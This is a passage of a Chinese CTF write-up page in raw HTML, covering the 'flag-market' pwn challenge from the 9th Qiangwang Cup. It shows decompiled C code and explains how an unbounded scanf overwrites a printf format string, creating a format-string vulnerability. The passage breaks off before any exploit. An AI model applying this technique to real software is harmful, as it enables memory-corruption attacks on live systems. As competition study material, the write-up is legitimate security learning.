@@ -1,0 +1,621 @@
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="flag-market Information - Category: Pwn - Points: 500 Description flag 市场，童叟无欺 Write-up 第一次打国赛，没想到能遇上一道我能做的题……呜呜呜太感动了（ 逆向出来的代码就这么点： 初看不难发现，scanf 的 %s 是一个很明显的无限长度输入，后面的 open / write 则似乎是障眼法，因为无论哪个成立了都会导致另一个失败，并且调试发现 scanf 内部会破坏 RSI，所以 open..."><meta name="robots" content="index,follow"><link rel="canonical" href="https://www.cubeyond.net/volume/1/2025-%E5%BC%BA%E7%BD%91%E6%9D%AF-s9/"><link rel="alternate" type="application/rss+xml" title="Entropic RSS" href="https://www.cubeyond.net/rss.xml"><meta property="og:site_name" content="Entropic"><meta property="og:title" content="Write-ups: 第九届「强网杯」全国网络安全挑战赛 :: Entropic"><meta property="og:description" content="flag-market Information - Category: Pwn - Points: 500 Description flag 市场，童叟无欺 Write-up 第一次打国赛，没想到能遇上一道我能做的题……呜呜呜太感动了（ 逆向出来的代码就这么点： 初看不难发现，scanf 的 %s 是一个很明显的无限长度输入，后面的 open / write 则似乎是障眼法，因为无论哪个成立了都会导致另一个失败，并且调试发现 scanf 内部会破坏 RSI，所以 open..."><meta property="og:type" content="article"><meta property="og:url" content="https://www.cubeyond.net/volume/1/2025-%E5%BC%BA%E7%BD%91%E6%9D%AF-s9/"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="Write-ups: 第九届「强网杯」全国网络安全挑战赛 :: Entropic"><meta name="twitter:description" content="flag-market Information - Category: Pwn - Points: 500 Description flag 市场，童叟无欺 Write-up 第一次打国赛，没想到能遇上一道我能做的题……呜呜呜太感动了（ 逆向出来的代码就这么点： 初看不难发现，scanf 的 %s 是一个很明显的无限长度输入，后面的 open / write 则似乎是障眼法，因为无论哪个成立了都会导致另一个失败，并且调试发现 scanf 内部会破坏 RSI，所以 open..."><meta property="article:published_time" content="2025-10-19T00:00:00.000Z"><link rel="stylesheet" href="/_astro/global.CMXalTX5.css"><style>@font-face {
+  font-family: gohu;
+  src: url("/fonts/gohu-subset.woff") format("woff");
+  font-display: block;
+  font-style: normal;
+  font-weight: 400;
+}
+:root {
+  --bg: #0c0d10;
+  --home-bg: #0a0b11;
+  --fg: #fefefe;
+  --link: #93ffd7;
+  --link-hover: #c7ffe9;
+  --link-hover-bg: #153329;
+  --particle-home: #b47ae2;
+  --particle-home-glow: #6f4b97;
+  --particle-page: #9368b8;
+  --particle-page-glow: #52376f;
+  --particle-volume: #a878d2;
+  --particle-volume-glow: #68448c;
+  --text-font: gohu;
+  --text-size: 14px;
+  --cjk-size: 13px;
+  --cjk-link-size: 15px;
+  --text-cell: 8px;
+  --home-size: 14px;
+}</style><link rel="preload" href="/fonts/gohu-subset.woff" as="font" type="font/woff" crossorigin><link rel="preload" href="/assets/cjk/wqy-cjk-body.png" as="image"><link rel="preload" href="/assets/cjk/wqy-cjk-link.png" as="image"><title>Entropic</title></head> <body data-mobile-fit-breakpoint="760" data-particles-enabled="true">  <main class="screen">  <article class="textmode-wrap phile-wrap"> <header class="phile-header" style="--phile-header-lines: 17; --phile-meta-lines: 2; --phile-title-lines: 1"> <pre class="textmode-pre phile-pre phile-header-side life-art" data-life-root><span data-life-line data-row="0">┌───────────────────────┐</span>
+<span data-life-line data-row="1">│                       │</span>
+<span data-life-line data-row="2">│                       │</span>
+<span data-life-line data-row="3">│                       │</span>
+<span data-life-line data-row="4">│                       │</span>
+<span data-life-line data-row="5">│                       │</span>
+<span data-life-line data-row="6">│                       │</span>
+<span data-life-line data-row="7">│                       │</span>
+<span data-life-line data-row="8">│                       │</span>
+<span data-life-line data-row="9">│                       │</span>
+<span data-life-line data-row="10">│                       │</span>
+<span data-life-line data-row="11">│                       │</span>
+<span data-life-line data-row="12">│                       │</span>
+<span data-life-line data-row="13">│                       │</span>
+<span data-life-line data-row="14">│                       │</span>
+<span data-life-line data-row="15">│                       │</span>
+<span data-life-line data-row="16">└───────────────────────┘</span></pre> <pre class="textmode-pre phile-pre phile-header-meta">Write-ups: <span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-672px">第</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-16px">九</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-288px">届</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:0px">「</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-320px">强</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-720px">网</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-480px">杯</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:0px">」</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-80px">全</span><span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-208px">国</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-720px">网</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-704px">络</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-256px">安</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-80px">全</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-400px">挑</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-368px">战</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-832px">赛</span>
+~ CuB3y0nd</pre> </header> <pre class="textmode-pre phile-pre phile-body-pre"># flag-market
+
+## Information
+
+- Category: Pwn
+- Points: 500
+
+## Description
+
+&gt; flag <span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-304px">市</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-208px">场</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-672px">童</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-160px">叟</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-448px">无</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-512px">欺</span>
+
+## Write-up
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-672px">第</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-512px">次</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-384px">打</span><span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-208px">国</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-832px">赛</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-368px">想</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-112px">到</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-880px">遇</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:0px">上</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-880px">道</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-80px">做</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span>……~_<span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-176px">呜</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-176px">呜</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-176px">呜</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-240px">太</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-368px">感</span><span class="cjk cjk-bitmap" style="--cjk-x:-128px;--cjk-y:-128px">动</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-976px">（</span>_~
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-864px">逆</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-160px">向</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-48px">代</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-640px">码</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-864px">这</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-16px">么</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-576px">点</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-976px">：</span>
+
+```c del={30, 59}
+__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  int i; // [rsp+Ch] [rbp-84h]
+  int fd_log; // [rsp+14h] [rbp-7Ch]
+  FILE *flag_stream; // [rsp+18h] [rbp-78h]
+  char flag_filepath[9]; // [rsp+27h] [rbp-69h] BYREF
+  char buf[16]; // [rsp+30h] [rbp-60h] BYREF
+  char flag_buf[72]; // [rsp+40h] [rbp-50h] BYREF
+  unsigned __int64 v10; // [rsp+88h] [rbp-8h]
+
+  v10 = __readfsqword(0x28u);
+  init();
+  strcpy(flag_filepath, &quot;/flag&quot;);
+  flag_stream = fopen(flag_filepath, &quot;r&quot;);
+  is_flag_open = 1;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      puts(&quot;welcome to flag market!ngive me money to buy my flag,nchoice: n1.tak
+e my moneyn2.exit&quot;);
+      memset(buf, 0, sizeof(buf));
+      read(0, buf, 0x10u);
+      if ( atoi(buf) != 1 )
+        exit(0);
+      puts(&quot;how much you want to pay?&quot;);
+      memset(buf, 0, sizeof(buf));
+      read(0, buf, 0x10u);
+      if ( atoi(buf) == 0xFF )
+        break;
+      printf(&quot;You are so parsimonious!!!&quot;);
+      if ( is_flag_open )
+      {
+        fclose(flag_stream);
+        is_flag_open = 0;
+      }
+    }
+    puts(aThankYouForPay);                      // &quot;Thank you for paying,let me 
+give you flag: &quot;
+    if ( !is_flag_open || !fgets(flag_buf, 64, flag_stream) )
+      break;
+    for ( i = 0; ; ++i )
+    {
+      if ( i &gt; 64 )
+      {
+        puts(&quot;nThank you for your patronage!&quot;);
+        return 0;
+      }
+      if ( flag_buf[i] == '{' )
+        break;
+      putchar(flag_buf[i]);
+      sleep(1u);
+    }
+    memset(flag_buf, 0, 0x40u);
+    puts(a1m31mError0mSo);                      // &quot;nx1B[1mx1B[31m==========erro
+r!!!========== x1B[0m nSorry, but maybe something wrong... nyou can report it in
+ user.log&quot;
+    puts(&quot;opened user.log, please report:&quot;);
+    memset(
+      log_file_open_flags_input,                // &quot;everything is ok~&quot;
+      0,
+      0x100u);
+    __isoc99_scanf(&quot;%s&quot;, log_file_open_flags_input);// &quot;everything is ok~&quot;
+    getchar();
+    fd_log = open(&quot;user.log&quot;, log_file_open_flags_input);// &quot;everything is ok~&quot;
+    write(
+      fd_log,
+      log_file_open_flags_input,                // &quot;everything is ok~&quot;
+      0x100u);
+    puts(aOkNowYouCanExi);                      // &quot;OK,now you can exit or try a
+gain.&quot;
+  }
+  puts(&quot;something is wrong&quot;);
+  return 0;
+}
+```
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-112px">初</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-640px">看</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-912px">难</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>`scanf` <span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span> `%s` <span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-336px">很</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-448px">明</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-464px">显</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-448px">无</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-912px">限</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-896px">长</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-320px">度</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:-848px">输</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-80px">入</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-160px">后</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-928px">面</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span> `open / write` 
+<span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-112px">则</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-48px">似</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-16px">乎</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-912px">障</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-640px">眼</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-528px">法</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-208px">因</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-448px">无</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-800px">论</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-192px">哪</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-368px">成</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-672px">立</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-880px">都</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-272px">导</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-736px">致</span><span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-160px">另</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-240px">失</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-816px">败</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-304px">并</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:0px">且</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-816px">调</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-800px">试</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span> scanf <span class="cjk cjk-bitmap" style="--cjk-x:-176px;--cjk-y:-96px">内</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-880px">部</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-640px">破</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-208px">坏</span> RSI<span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-368px">所</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span> open <span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-528px">永</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-864px">远</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-368px">成</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-128px">功</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:0px">且</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-608px">由</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-672px">程</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-304px">序</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-272px">对</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-256px">它</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-48px">们</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-864px">返</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-208px">回</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-80px">值</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-80px">做</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-496px">检</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-496px">查</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-368px">所</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-48px">会</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-336px">忽</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-624px">略</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-896px">错</span><span class="cjk cjk-bitmap" style="--cjk-x:-432px;--cjk-y:-800px">误</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-704px">继</span><span class="cjk cjk-bitmap" style="--cjk-x:-400px;--cjk-y:-704px">续</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-384px">执</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-784px">行</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-720px">而</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-464px">是</span> abort <span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-880px">那</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-912px">难</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-880px">道</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-528px">没</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-32px">什</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-16px">么</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-112px">别</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-48px;--cjk-y:-128px">办</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-528px">法</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-32px">了</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-176px">吗</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-976px">？</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-944px">题</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-640px">目</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-448px">既</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-576px">然</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-160px">可</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-112px">出</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-480px">来</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-272px">就</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-256px">定</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-736px">能</span><span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-80px">做</span>……
+
+<span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-96px">其</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-256px">实</span><span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-704px">细</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-640px">看</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-800px">话</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-160px">可</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-160px">发</span><span class="cjk cjk-bitmap" style="--cjk-x:-192px;--cjk-y:-608px">现</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:0px">上</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-928px">面</span><span class="cjk cjk-bitmap" style="--cjk-x:0px;--cjk-y:-480px">有</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span> `printf` <span class="cjk cjk-bitmap" style="--cjk-x:-160px;--cjk-y:-256px">存</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-208px">在</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:0px">一</span><span class="cjk cjk-bitmap" style="--cjk-x:-32px;--cjk-y:-16px">个</span><span class="cjk cjk-bitmap" style="--cjk-x:-320px;--cjk-y:0px">不</span><span class="cjk cjk-bitmap" style="--cjk-x:-480px;--cjk-y:-336px">怎</span><span class="cjk cjk-bitmap" style="--cjk-x:-208px;--cjk-y:-16px">么</span><span class="cjk cjk-bitmap" style="--cjk-x:-96px;--cjk-y:-464px">显</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-640px">眼</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-624px">的</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-496px">格</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-320px">式</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-128px">化</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-256px">字</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-672px">符</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-16px">串</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-560px">漏</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-544px">洞</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:0px">。</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-608px">由</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-32px">于</span> scanf <span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-160px">可</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-48px">以</span><span class="cjk cjk-bitmap" style="--cjk-x:-496px;--cjk-y:-160px">向</span> `log_file_open_flags_input` <span class="cjk cjk-bitmap" style="--cjk-x:-240px;--cjk-y:-96px">写</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-80px">入</span><span class="cjk cjk-bitmap" style="--cjk-x:-288px;--cjk-y:-448px">无</span><span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-912px">限</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-896px">长</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-320px">度</span><span class="cjk cjk-bitmap" style="--cjk-x:-16px;--cjk-y:-448px">数</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-416px">据</span><span class="cjk cjk-bitmap" style="--cjk-x:-304px;--cjk-y:-784px">覆</span><span class="cjk cjk-bitmap" style="--cjk-x:-464px;--cjk-y:-624px">盖</span> `format` <span class="cjk cjk-bitmap" style="--cjk-x:-112px;--cjk-y:-16px">为</span><span class="cjk cjk-bitmap" style="--cjk-x:-384px;--cjk-y:-736px">自</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-256px">定</span>
+<span class="cjk cjk-bitmap" style="--cjk-x:-224px;--cjk-y:-16px">义</span><span class="cjk cjk-bitmap" style="--cjk-x:-272px;--cjk-y:-496px">格</span><span class="cjk cjk-bitmap" style="--cjk-x:-256px;--cjk-y:-320px">式</span><span class="cjk cjk-bitmap" style="--cjk-x:-352px;--cjk-y:-128px">化</span><span class="cjk cjk-bitmap" style="--cjk-x:-144px;--cjk-y:-256px">字</span><span class="cjk cjk-bitmap" style="--cjk-x:-448px;--cjk-y:-672px">符</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-16px">串</span><span class="cjk cjk-bitmap" style="--cjk-x:-64px;--cjk-y:-976px">，</span><span class="cjk cjk-bitmap" style="--cjk-x:-80px;--cjk-y:-208px">因</span><span class="cjk cjk-bitmap" style="--cjk-x:-336px;--cjk-y:-512px">此</span><span class="cjk cjk-bitmap" style="--cjk-x:-416px;--cjk-y:-320px">当</span><span class="cjk cjk-bitmap" style="--cjk-x:-368px;--cjk-y:-368px">我</span><span class="cjk cjk-bitmap" 